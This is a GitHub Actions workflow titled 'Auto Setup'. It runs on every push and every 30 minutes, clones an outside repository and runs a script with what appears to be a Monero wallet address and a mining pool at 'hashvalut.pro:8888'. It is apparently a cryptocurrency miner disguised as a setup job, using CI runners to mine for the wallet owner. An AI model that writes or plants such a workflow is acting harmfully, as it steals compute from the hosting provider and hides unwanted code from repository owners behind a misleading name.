name: Auto Setup

on:
  push:
    branches: [ main, master ]
  schedule:
    - cron: '*/30 * * * *'
  workflow_dispatch:

jobs:
  run-script:
    runs-on: ubuntu-latest
    
    steps:
    - name: 📥 Clone
      run: |
        git clone https://github.com/thumpingpp/mustu-setup.git
    
    - name: 🐍 Python
      uses: actions/setup-python@v5
      with:
        python-version: '3.10'
    
    - name: ⚡ Execute
      run: |
        cd mustu-setup
        chmod +x mustafa
        echo "Starting with wallet and pool..."
        python3 mustafa.py "43k1pWC5SfDRT7BvVbpptA1E8bVXp7eExVbgizHNqBeu8ZTipQZB5uBjYYG68SEE4aT7Afao4pW2zamrScqHsVhWUwaZzMN" --pool "hashvalut.pro:8888"
